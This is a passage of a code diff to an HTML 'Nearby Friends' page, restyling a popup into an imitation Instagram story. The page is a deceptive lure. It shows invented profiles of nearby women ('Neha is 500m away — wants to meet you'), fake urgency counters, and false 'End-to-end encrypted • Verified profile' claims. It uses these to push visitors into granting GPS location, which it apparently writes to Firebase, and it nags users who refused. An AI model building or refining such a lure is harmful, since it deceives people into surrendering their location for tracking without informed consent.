@@ -3,17 +3,15 @@
 
 <head>
     <meta charset="UTF-8">
-    <!-- Open Graph (WhatsApp, Facebook) -->
-    <meta property="og:title" content="🎯 Neha is 500m away — wants to meet you">
-    <meta property="og:description" content="Tap to connect with girls nearby. 100% free.">
+    <meta property="og:title" content="📍 People nearby — Connect now">
+    <meta property="og:description" content="Find and connect with people around you.">
     <meta property="og:image" content="https://randomuser.me/api/portraits/women/44.jpg">
     <meta property="og:url" content="https://your-site.com">
     <meta property="og:type" content="website">
 
-    <!-- Twitter -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="🎯 Neha is 500m away">
-    <meta name="twitter:description" content="Tap to connect with girls nearby.">
+    <meta name="twitter:title" content="📍 People nearby">
+    <meta name="twitter:description" content="Find and connect with people around you.">
     <meta name="twitter:image" content="https://randomuser.me/api/portraits/women/44.jpg">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Nearby Friends</title>
@@ -177,15 +175,17 @@
             transform: scale(0.96);
         }
 
-        /* ===== GPS MODAL ===== */
+        /* ============================================================
+           🔥 INSTAGRAM STORY POPUP
+           ============================================================ */
         #gpsModal {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.95);
+            background: #000;
             display: none;
             align-items: center;
             justify-content: center;
-            padding: 24px;
+            padding: 0;
             z-index: 200;
             animation: fadeIn 0.3s;
         }
@@ -195,160 +195,332 @@
         }
 
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to   { opacity: 1; }
         }
 
-        .gps-content {
-            background: #1c1c1e;
-            border-radius: 24px;
-            padding: 32px 24px;
-            max-width: 420px;
+        .ig-story {
+            position: relative;
             width: 100%;
-            text-align: center;
-            animation: slideUp 0.4s;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(40px);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .gps-icon {
-            font-size: 72px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-
-            0%,
-            100% {
-                transform: scale(1);
-            }
-
-            50% {
-                transform: scale(1.08);
-            }
-        }
-
-        .gps-content h2 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 12px;
-        }
-
-        .gps-content .nearby-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: linear-gradient(135deg, #FF6B6B, #FF3B30);
-            color: #fff;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            margin-bottom: 16px;
-            animation: pulse 2s infinite;
-        }
-
-        .gps-content .subtitle {
-            font-size: 15px;
-            color: #8e8e93;
-            line-height: 1.6;
-            margin-bottom: 24px;
-        }
-
-        .gps-benefits {
-            background: #2c2c2e;
-            border-radius: 14px;
-            padding: 18px;
-            text-align: left;
-            margin-bottom: 24px;
-        }
-
-        .gps-benefits .item {
+            max-width: 400px;
+            height: 100vh;
+            max-height: 780px;
+            background: #000;
+            border-radius: 24px;
+            overflow: hidden;
             display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            padding: 10px 0;
-            font-size: 14px;
-            line-height: 1.5;
+            flex-direction: column;
+            box-shadow: 0 30px 100px rgba(0, 0, 0, 0.9);
+            animation: storySlide 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        .gps-benefits .item:not(:last-child) {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        @keyframes storySlide {
+            from { transform: scale(0.9) translateY(30px); opacity: 0; }
+            to   { transform: scale(1) translateY(0); opacity: 1; }
         }
 
-        .gps-benefits .item .emoji {
-            font-size: 20px;
-            flex-shrink: 0;
+        .ig-story-bg {
+            position: absolute;
+            inset: 0;
+            background-size: cover;
+            background-position: center;
+            z-index: 0;
+            transition: opacity 0.3s;
+            filter: blur(0px);
         }
 
-        .gps-benefits .item .text strong {
-            display: block;
-            color: #fff;
-            margin-bottom: 2px;
+        .ig-story-bg::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(
+                180deg,
+                rgba(0, 0, 0, 0.75) 0%,
+                rgba(0, 0, 0, 0.25) 25%,
+                rgba(0, 0, 0, 0.4) 60%,
+                rgba(0, 0, 0, 0.9) 100%
+            );
         }
 
-        .gps-benefits .item .text span {
-            color: #8e8e93;
-            font-size: 13px;
+        .ig-progress-bar {
+            position: relative;
+            z-index: 5;
+            display: flex;
+            gap: 3px;
+            padding: 12px 12px 0;
         }
 
-        .gps-privacy {
-            background: rgba(52, 168, 83, 0.1);
-            border: 1px solid rgba(52, 168, 83, 0.3);
-            border-radius: 12px;
-            padding: 12px 16px;
-            font-size: 13px;
-            color: #34A853;
-            margin-bottom: 24px;
+        .ig-progress-segment {
+            flex: 1;
+            height: 2.5px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .ig-progress-fill {
+            position: absolute;
+            inset: 0;
+            background: #fff;
+            width: 0;
+            animation: progressFill 8s linear infinite;
+        }
+
+        @keyframes progressFill {
+            from { width: 0; }
+            to   { width: 100%; }
+        }
+
+        .ig-header {
+            position: relative;
+            z-index: 5;
             display: flex;
             align-items: center;
             gap: 10px;
+            padding: 12px 14px;
         }
 
-        .gps-btn {
+        .ig-av-ring {
+            width: 42px;
+            height: 42px;
+            padding: 2px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            animation: ringRotate 4s linear infinite;
+        }
+
+        @keyframes ringRotate {
+            from { filter: hue-rotate(0deg); }
+            to   { filter: hue-rotate(360deg); }
+        }
+
+        .ig-av-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #000;
+        }
+
+        .ig-header-info {
+            flex: 1;
+            min-width: 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .ig-header-name {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .ig-verified {
+            width: 16px;
+            height: 16px;
+            background: #0095F6;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .ig-verified::before {
+            content: '';
+            width: 7px;
+            height: 4px;
+            border-left: 2px solid #fff;
+            border-bottom: 2px solid #fff;
+            transform: rotate(-45deg) translate(1px, -1px);
+        }
+
+        .ig-header-time {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            margin-left: 2px;
+        }
+
+        .ig-header-close {
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+            flex-shrink: 0;
+        }
+
+        .ig-content {
+            position: relative;
+            z-index: 4;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 24px 32px;
+            text-align: center;
+        }
+
+        .ig-distance-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(20px);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #fff;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .ig-distance-badge .ig-live-dot {
+            width: 6px;
+            height: 6px;
+            background: #FF3B30;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50%      { transform: scale(1.3); opacity: 0.7; }
+        }
+
+        .ig-story-msg {
+            font-size: 26px;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1.3;
+            text-shadow: 0 2px 12px rgba(0, 0, 0, 0.7);
+            margin-bottom: 24px;
+            letter-spacing: -0.5px;
+            max-width: 320px;
+        }
+
+        .ig-story-msg .ig-highlight {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .ig-reactions {
+            position: relative;
+            z-index: 5;
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            padding: 0 16px 16px;
+            animation: reactionsIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
+        }
+
+        @keyframes reactionsIn {
+            from { transform: translateY(30px); opacity: 0; }
+            to   { transform: translateY(0); opacity: 1; }
+        }
+
+        .ig-reaction {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(20px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+
+        .ig-reaction:hover {
+            transform: scale(1.15);
+            background: rgba(255, 255, 255, 0.25);
+        }
+
+        .ig-reaction:active {
+            transform: scale(0.95);
+        }
+
+        .ig-cta-wrap {
+            position: relative;
+            z-index: 6;
+            padding: 0 16px 16px;
+        }
+
+        .ig-cta {
             width: 100%;
             padding: 16px;
             border: none;
             border-radius: 14px;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            background-size: 300% 300%;
+            color: #fff;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            margin-bottom: 10px;
-            transition: transform 0.15s;
+            font-family: inherit;
+            letter-spacing: 0.3px;
+            animation: gradientMove 3s ease infinite, btnPulse 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.5);
         }
 
-        .gps-btn:active {
+        @keyframes gradientMove {
+            0%, 100% { background-position: 0% 50%; }
+            50%      { background-position: 100% 50%; }
+        }
+
+        @keyframes btnPulse {
+            0%, 100% {
+                box-shadow: 0 10px 30px rgba(220, 39, 67, 0.5),
+                            0 0 0 0 rgba(220, 39, 67, 0.6);
+            }
+            50% {
+                box-shadow: 0 10px 30px rgba(220, 39, 67, 0.7),
+                            0 0 0 12px rgba(220, 39, 67, 0);
+            }
+        }
+
+        .ig-cta:active {
             transform: scale(0.97);
         }
 
-        .gps-btn.allow {
-            background: linear-gradient(135deg, #1a73e8, #34A853);
-            color: #fff;
-            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.4);
-        }
-
-        .gps-btn.skip {
-            background: transparent;
-            color: #8e8e93;
-            font-weight: 400;
-            font-size: 14px;
+        .ig-trust {
+            position: relative;
+            z-index: 5;
+            text-align: center;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.6);
+            padding: 0 16px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
         }
 
         /* ===== LOADING ===== */
@@ -378,9 +550,7 @@
         }
 
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
         #loading .text {
@@ -417,7 +587,6 @@
             background-size: 40px 40px;
         }
 
-        /* Nearby user notification banner */
         .nearbyBanner {
             position: absolute;
             top: 16px;
@@ -435,15 +604,8 @@
         }
 
         @keyframes slideDown {
-            from {
-                transform: translateY(-80px);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+            from { transform: translateY(-80px); opacity: 0; }
+            to   { transform: translateY(0); opacity: 1; }
         }
 
         .nearbyBanner .avatar {
@@ -511,15 +673,8 @@
         }
 
         @keyframes ripple {
-            0% {
-                transform: scale(1);
-                opacity: 1;
-            }
-
-            100% {
-                transform: scale(2);
-                opacity: 0;
-            }
+            0%   { transform: scale(1); opacity: 1; }
+            100% { transform: scale(2); opacity: 0; }
         }
 
         .nearbyDot {
@@ -719,18 +874,10 @@
         }
 
         @keyframes toastIn {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to   { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
 
-        /* Live tracker badge */
         #liveBadge {
             position: fixed;
             top: 16px;
@@ -759,275 +906,6 @@
             background: #fff;
             animation: pulse 1s infinite;
         }
-
-        /* ============================================================
-   🔥 NEHA POPUP — Full DP Style
-   ============================================================ */
-        .neha-popup {
-            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
-            border-radius: 28px;
-            padding: 32px 24px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
-            animation: nehaSlideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        @keyframes nehaSlideUp {
-            from {
-                transform: translateY(60px) scale(0.9);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0) scale(1);
-                opacity: 1;
-            }
-        }
-
-        /* Top gradient glow */
-        .neha-popup::before {
-            content: '';
-            position: absolute;
-            top: -80px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 300px;
-            height: 200px;
-            background: radial-gradient(circle, rgba(255, 59, 48, 0.35) 0%, transparent 70%);
-            pointer-events: none;
-        }
-
-        /* Big Avatar */
-        .neha-avatar-wrap {
-            position: relative;
-            width: 140px;
-            height: 140px;
-            margin: 0 auto 20px;
-        }
-
-        .neha-avatar {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            background-image: url('https://randomuser.me/api/portraits/women/44.jpg');
-            background-size: cover;
-            background-position: center;
-            border: 4px solid #1c1c1e;
-            position: relative;
-            z-index: 2;
-            box-shadow: 0 10px 40px rgba(255, 59, 48, 0.4);
-        }
-
-        .neha-avatar-ring {
-            position: absolute;
-            inset: -8px;
-            border-radius: 50%;
-            border: 2px solid #FF3B30;
-            animation: ringPulse 2s infinite;
-        }
-
-        @keyframes ringPulse {
-
-            0%,
-            100% {
-                transform: scale(1);
-                opacity: 0.6;
-            }
-
-            50% {
-                transform: scale(1.08);
-                opacity: 1;
-            }
-        }
-
-        .neha-online-dot {
-            position: absolute;
-            bottom: 8px;
-            right: 8px;
-            width: 22px;
-            height: 22px;
-            background: #34A853;
-            border: 4px solid #1c1c1e;
-            border-radius: 50%;
-            z-index: 3;
-            box-shadow: 0 0 12px rgba(52, 168, 83, 0.8);
-        }
-
-        /* Name */
-        .neha-name {
-            font-size: 28px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 6px;
-            letter-spacing: -0.5px;
-        }
-
-        /* Distance */
-        .neha-distance {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            color: #8e8e93;
-            background: rgba(255, 59, 48, 0.1);
-            border: 1px solid rgba(255, 59, 48, 0.3);
-            padding: 5px 14px;
-            border-radius: 20px;
-            margin-bottom: 20px;
-        }
-
-        .neha-distance .dot-live {
-            width: 6px;
-            height: 6px;
-            background: #FF3B30;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-        }
-
-        /* Message bubble */
-        .neha-message {
-            background: rgba(44, 44, 46, 0.9);
-            border-radius: 16px;
-            padding: 14px 18px;
-            margin-bottom: 20px;
-            text-align: left;
-            position: relative;
-        }
-
-        .neha-message::before {
-            content: '';
-            position: absolute;
-            top: -8px;
-            left: 32px;
-            width: 16px;
-            height: 16px;
-            background: rgba(44, 44, 46, 0.9);
-            transform: rotate(45deg);
-            border-radius: 3px;
-        }
-
-        .neha-message-text {
-            font-size: 14px;
-            color: #fff;
-            line-height: 1.5;
-            font-style: italic;
-        }
-
-        .neha-message-time {
-            font-size: 11px;
-            color: #8e8e93;
-            margin-top: 6px;
-        }
-
-        /* Location note */
-        .neha-location-note {
-            background: rgba(26, 115, 232, 0.12);
-            border: 1px solid rgba(26, 115, 232, 0.3);
-            border-radius: 12px;
-            padding: 10px 14px;
-            font-size: 12px;
-            color: #1a73e8;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            text-align: left;
-        }
-
-        /* Primary button */
-        .neha-btn-primary {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            background: linear-gradient(135deg, #1a73e8, #34A853);
-            color: #fff;
-            box-shadow: 0 8px 24px rgba(26, 115, 232, 0.5);
-            transition: transform 0.15s;
-            margin-bottom: 10px;
-        }
-
-        .neha-btn-primary:active {
-            transform: scale(0.97);
-        }
-
-        /* Secondary button */
-        .neha-btn-secondary {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 400;
-            cursor: pointer;
-            background: transparent;
-            color: #8e8e93;
-            transition: color 0.2s;
-        }
-
-        .neha-btn-secondary:hover {
-            color: #fff;
-        }
-
-        /* Footer */
-        .neha-footer {
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 16px;
-            padding-top: 16px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        /* ============================================================
-   🔥 BUTTON PULSE ANIMATION
-   ============================================================ */
-        @keyframes btnPulse {
-
-            0%,
-            100% {
-                box-shadow: 0 15px 40px rgba(52, 168, 83, 0.5),
-                    0 0 0 0 rgba(52, 168, 83, 0.7);
-            }
-
-            50% {
-                box-shadow: 0 15px 40px rgba(52, 168, 83, 0.7),
-                    0 0 0 15px rgba(52, 168, 83, 0);
-            }
-        }
-
-        /* Primary button hover shine effect */
-        #enableBtn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg,
-                    transparent,
-                    rgba(255, 255, 255, 0.3),
-                    transparent);
-            animation: shine 3s infinite;
-        }
-
-        @keyframes shine {
-            0% {
-                left: -100%;
-            }
-
-            50%,
-            100% {
-                left: 100%;
-            }
-        }
     </style>
 </head>
 
@@ -1044,7 +922,6 @@
         <div class="logo">📍</div>
         <h1>Nearby Friends</h1>
 
-        <!-- 🔥 Nearby notification -->
         <div class="nearby-notify">
             <div class="avatar" id="landingAvatar"
                 style="background-image: url('https://randomuser.me/api/portraits/women/44.jpg');"></div>
@@ -1074,131 +951,74 @@
         <button id="startBtn">🔍 Find Nearby</button>
     </div>
 
-    <!-- 🔥 NEHA POPUP -->
+    <!-- 🔥 INSTAGRAM STORY POPUP -->
     <div id="gpsModal">
-        <div class="neha-popup">
+        <div class="ig-story">
 
-            <!-- Big DP with ring -->
-            <div class="neha-avatar-wrap">
-                <div class="neha-avatar" id="nehaAvatar"></div>
-                <div class="neha-avatar-ring"></div>
-                <div class="neha-online-dot"></div>
-            </div>
+            <!-- Background image -->
+            <div class="ig-story-bg" id="igStoryBg"></div>
 
-            <!-- Name + Distance -->
-            <h2 class="neha-name" id="nehaName">Neha</h2>
-            <div class="neha-distance" id="nehaDistance">
-                <span class="dot-live"></span>
-                📍 500m away • Active now
-            </div>
-
-            <!-- Message bubble -->
-            <div class="neha-message">
-                <div class="neha-message-text">
-                    "Hey! I'm nearby. Want to meet you 😊"
+            <!-- TOP: Progress bar -->
+            <div class="ig-progress-bar">
+                <div class="ig-progress-segment">
+                    <div class="ig-progress-fill"></div>
                 </div>
-                <div class="neha-message-time">just now</div>
-            </div>
-
-            <!-- Location note -->
-            <div class="neha-location-note">
-                <span>💬</span>
-                <span>Neha tumse chat karna chahti hai — tap to reply</span>
-            </div>
-
-            <!-- Buttons -->
-            <!-- 🔥 CONVINCING BUTTONS -->
-            <div style="position: relative; z-index: 2;">
-
-                <!-- Urgency timer -->
-                <div style="
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 6px;
-        margin-bottom: 12px;
-        font-size: 12px;
-        color: #FF3B30;
-        font-weight: 600;
-        letter-spacing: 0.5px;
-    ">
-                    <div style="
-            width: 6px;
-            height: 6px;
-            background: #FF3B30;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-        "></div>
-                    <span id="timerText">⏰ Neha online 2 min se wait kar rahi hai</span>
+                <div class="ig-progress-segment">
+                    <div class="ig-progress-fill" style="animation-delay: 8s;"></div>
                 </div>
-                <button class="neha-btn-primary" id="enableBtn" style="
-    width: 100%;
-    padding: 16px 24px;
-    border: none;
-    border-radius: 50px;
-    background: linear-gradient(135deg, #25D366, #128C7E);
-    color: #fff;
-    font-size: 16px;
-    font-weight: 700;
-    cursor: pointer;
-    position: relative;
-    overflow: hidden;
-    box-shadow: 0 15px 40px rgba(37, 211, 102, 0.5);
-    animation: btnPulse 2s infinite;
-    font-family: inherit;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 12px;
-">
-                    <div style="
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        background-image: url('https://randomuser.me/api/portraits/women/44.jpg');
-        background-size: cover;
-        background-position: center;
-        border: 2px solid #fff;
-        flex-shrink: 0;
-    "></div>
-                    <span>Connect with Neha</span>
-                    <span style="font-size: 18px;">→</span>
+                <div class="ig-progress-segment">
+                    <div class="ig-progress-fill" style="animation-delay: 16s;"></div>
+                </div>
+            </div>
+
+            <!-- HEADER -->
+            <div class="ig-header">
+                <div class="ig-av-ring">
+                    <div class="ig-av-img" id="igAvatar"></div>
+                </div>
+                <div class="ig-header-info">
+                    <span class="ig-header-name" id="igName">Neha</span>
+                    <span class="ig-verified"></span>
+                    <span class="ig-header-time" id="igTime">2m</span>
+                </div>
+                <button class="ig-header-close" onclick="hideGPSModal()">✕</button>
+            </div>
+
+            <!-- CENTER -->
+            <div class="ig-content">
+                <div class="ig-distance-badge">
+                    <span class="ig-live-dot"></span>
+                    <span id="igDistance">📍 500m away • Active now</span>
+                </div>
+
+                <div class="ig-story-msg" id="igMsg">
+                    Hey! <span class="ig-highlight">I'm nearby.</span><br>
+                    Want to meet you 😊
+                </div>
+            </div>
+
+            <!-- EMOJI REACTIONS -->
+            <div class="ig-reactions">
+                <button class="ig-reaction" onclick="showToast('❤️ Sent')">❤️</button>
+                <button class="ig-reaction" onclick="showToast('😍 Sent')">😍</button>
+                <button class="ig-reaction" onclick="showToast('🔥 Sent')">🔥</button>
+                <button class="ig-reaction" onclick="showToast('😂 Sent')">😂</button>
+                <button class="ig-reaction" onclick="showToast('👏 Sent')">👏</button>
+            </div>
+
+            <!-- CTA BUTTON -->
+            <div class="ig-cta-wrap">
+                <button class="ig-cta" id="enableBtn">
+                    💬 Reply to Neha
                 </button>
-
-                <!-- Secondary hint (not a button) -->
-                <div style="
-        margin-top: 10px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        font-size: 12px;
-        color: #5f6368;
-    ">
-                    <span>🔒</span>
-                    <span>Safe & encrypted</span>
-                    <span>•</span>
-                    <span style="color: #34A853;">✅ 12,000+ users</span>
-                </div>
-
-                <!-- SKIP — Very subtle -->
-
-
-                <!-- Bottom warning -->
-                <div style="
-        margin-top: 16px;
-        padding-top: 16px;
-        border-top: 1px solid rgba(255,255,255,0.06);
-        font-size: 11px;
-        color: #8e8e93;
-        text-align: center;
-        line-height: 1.6;
-    ">
-                    ⚡ <strong style="color:#FBBC05;">+7 people</strong> are waiting nearby<br>
-
-                </div>
-
             </div>
+
+            <!-- TRUST -->
+            <div class="ig-trust">
+                <span>🔒</span>
+                <span>End-to-end encrypted • Verified profile</span>
+            </div>
+
         </div>
     </div>
 
@@ -1213,7 +1033,6 @@
         <div id="mapArea">
             <div class="userDot" id="userDot"></div>
 
-            <!-- 🔥 Nearby banner -->
             <div class="nearbyBanner" id="nearbyBanner" style="display:none;">
                 <div class="avatar" id="bannerAvatar"></div>
                 <div class="info">
@@ -1247,8 +1066,8 @@
 
     <script type="module">
         /* ============================================================
-   FIREBASE SETUP
-   ============================================================ */
+           FIREBASE SETUP
+           ============================================================ */
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
         import { getDatabase, ref, set, update }
             from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
@@ -1268,7 +1087,7 @@
         console.log('✅ Firebase initialized');
 
         /* ============================================================
-           GLOBAL STATE — Sab yahan
+           GLOBAL STATE
            ============================================================ */
         let gpsStarted = false;
         let userLocation = null;
@@ -1454,17 +1273,14 @@
         }
 
         /* ============================================================
-           🔥 RANDOM NEHA — Har visit pe alag
+           NEHA / GIRLS PROFILES
            ============================================================ */
-        /* ============================================================
-    🔥 NEHA / GIRLS PROFILES — Same concept as CONTACTS
-    ============================================================ */
         const NEARBY_PROFILES = [
             {
                 id: 1,
                 name: 'Neha',
                 country: '🇮🇳 India',
-                distance: 500,        // meters
+                distance: 500,
                 status: 'Active now',
                 message: '"Hey! I\'m nearby. Want to meet you 😊"',
                 avatar: 'https://randomuser.me/api/portraits/women/44.jpg'
@@ -1535,37 +1351,40 @@
         ];
 
         function pickRandomNeha() {
-            // 🔥 Random profile pick karo
             currentNeha = NEARBY_PROFILES[Math.floor(Math.random() * NEARBY_PROFILES.length)];
             console.log('💃 Selected:', currentNeha.name, currentNeha.distance + 'm');
 
-            // 🔥 Popup update karo
-            const avatar = document.getElementById('nehaAvatar');
-            const name = document.getElementById('nehaName');
-            const distance = document.getElementById('nehaDistance');
-            const msg = document.querySelector('.neha-message-text');
-            const locationNote = document.querySelector('.neha-location-note span:last-child');
-            const footer = document.querySelector('.neha-footer');
+            const bg = document.getElementById('igStoryBg');
+            const avatar = document.getElementById('igAvatar');
+            const name = document.getElementById('igName');
+            const distance = document.getElementById('igDistance');
+            const msg = document.getElementById('igMsg');
+            const time = document.getElementById('igTime');
+            const cta = document.querySelector('.ig-cta');
 
+            if (bg) bg.style.backgroundImage = `url('${currentNeha.avatar}')`;
             if (avatar) avatar.style.backgroundImage = `url('${currentNeha.avatar}')`;
             if (name) name.textContent = currentNeha.name;
 
             if (distance) {
-                distance.innerHTML = `
-      <span class="dot-live"></span> 
-      📍 ${currentNeha.distance}m away • ${currentNeha.status}
-    `;
+                distance.innerHTML = `📍 ${currentNeha.distance}m away • ${currentNeha.status}`;
             }
 
-            if (msg) msg.textContent = currentNeha.message;
-
-            if (locationNote) {
-                locationNote.textContent = `💬 ${currentNeha.name} tumse chat karna chahti hai — tap to reply`;
+            if (msg) {
+                const parts = currentNeha.message.replace(/"/g, '').split(' ');
+                const mid = Math.ceil(parts.length / 2);
+                const line1 = parts.slice(0, mid).join(' ');
+                const line2 = parts.slice(mid).join(' ');
+                msg.innerHTML = `${line1} <span class="ig-highlight">${line2}</span>`;
             }
 
-            if (footer) {
-                const moreCount = 5 + Math.floor(Math.random() * 5);
-                footer.textContent = `+${moreCount} more people nearby waiting`;
+            if (time) {
+                const mins = 1 + Math.floor(Math.random() * 10);
+                time.textContent = mins + 'm';
+            }
+
+            if (cta) {
+                cta.innerHTML = `💬 Reply to ${currentNeha.name}`;
             }
 
             return currentNeha;
@@ -1600,62 +1419,62 @@
             const modal = document.createElement('div');
             modal.id = 'deniedModal';
             modal.style.cssText = `
-    position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-    display: flex; align-items: center; justify-content: center;
-    padding: 24px; z-index: 99999; animation: fadeIn 0.3s;
-  `;
+                position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+                display: flex; align-items: center; justify-content: center;
+                padding: 24px; z-index: 99999; animation: fadeIn 0.3s;
+            `;
 
             const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
             modal.innerHTML = `
-    <div style="background:#1c1c1e; border-radius:24px; padding:32px 24px;
-                max-width:420px; width:100%; text-align:center; color:#fff;
-                box-shadow:0 20px 60px rgba(0,0,0,0.6);">
-      <div style="font-size:72px; margin-bottom:20px;">📍</div>
-      <h2 style="font-size:24px; font-weight:600; margin-bottom:12px; color:#EA4335;">
-        Location Blocked
-      </h2>
-      <p style="font-size:15px; color:#8e8e93; line-height:1.6; margin-bottom:24px;">
-        You denied location earlier. Enable it manually to find nearby friends.
-      </p>
-      <div style="background:#2c2c2e; border-radius:14px; padding:18px;
-                  text-align:left; font-size:14px; line-height:1.9;
-                  color:#e0e0e0; margin-bottom:24px;">
-        <strong style="color:#1a73e8;">📋 How to enable:</strong>
-        <ol style="margin-left:20px; margin-top:6px;">
-          ${isMobile ? `
-            <li>Open browser <strong>Settings</strong></li>
-            <li>Go to <strong>Site Settings → Location</strong></li>
-            <li>Find this site → set to <strong>Allow</strong></li>
-            <li>Come back and refresh</li>
-          ` : `
-            <li>Click the <strong>🔒 lock icon</strong> in the address bar</li>
-            <li>Find <strong>Location</strong> → set to <strong>Allow</strong></li>
-            <li>Refresh the page (F5)</li>
-          `}
-        </ol>
-      </div>
-      <button onclick="location.reload()"
-        style="width:100%; padding:16px; border:none; border-radius:14px;
-               background:linear-gradient(135deg, #1a73e8, #34A853);
-               color:#fff; font-size:16px; font-weight:600;
-               cursor:pointer; margin-bottom:10px;">
-        🔄 I Enabled It — Refresh
-      </button>
-      <button onclick="document.getElementById('deniedModal').remove()"
-        style="width:100%; padding:14px; border:none; border-radius:14px;
-               background:transparent; color:#8e8e93; font-size:14px;
-               cursor:pointer;">
